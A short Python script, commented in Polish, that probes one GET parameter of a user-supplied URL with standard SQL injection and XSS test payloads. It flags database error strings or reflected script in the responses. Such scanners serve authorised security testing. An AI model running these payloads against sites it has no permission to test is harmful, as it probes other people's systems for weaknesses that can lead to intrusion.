import requests
import re
import threading

# === Walidacja URL ===
def validate_url(url):
    return url.startswith("http://") or url.startswith("https://")

# === Pobranie URL ===
url = input("Enter full target URL (must include GET param, e.g. http://site.com/page.php?id=): ").strip()

if not validate_url(url):
    print("[-] Invalid URL. Must start with http:// or https://")
    exit()

# === Ręczne rozbijanie URL i wyciąganie parametru ===
if '?' not in url or '=' not in url:
    print("[-] URL must contain at least one GET parameter (e.g. ?id=123)")
    exit()

# Oddziel część główną i parametry
main_part, query_string = url.split('?', 1)
first_param = query_string.split('&')[0]  # np. id=123
param_name = first_param.split('=')[0]    # id

print(f"[i] Detected GET parameter: '{param_name}'")
base_url = main_part  # bez parametrów

# === Payloady testowe ===
payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

# === Typowe błędy SQLi ===
sqli_errors = [
    "SQL syntax", "SQLite3::query():", "MySQL server", "syntax error",
    "Unclosed quotation mark", "near 'SELECT'", "Unknown column",
    "Warning: mysql_fetch", "Fatal error"
]

# === Skanowanie podatności ===
def scan_payload(vuln_type, payload):
    try:
        response = requests.get(base_url, params={param_name: payload}, timeout=5)
        content = response.text.lower()

        if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
            print(f"[+] Potential SQL Injection detected with payload: {payload}")

        elif vuln_type == "XSS" and payload.lower() in content:
            print(f"[+] Potential XSS detected with payload: {payload}")

        else:
            print(f"[-] No issue detected with payload: {payload}")

    except requests.RequestException as e:
        print(f"[!] Request failed for payload '{payload}': {e}")

# === Wątki ===
threads = []

for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

for t in threads:
    t.join()
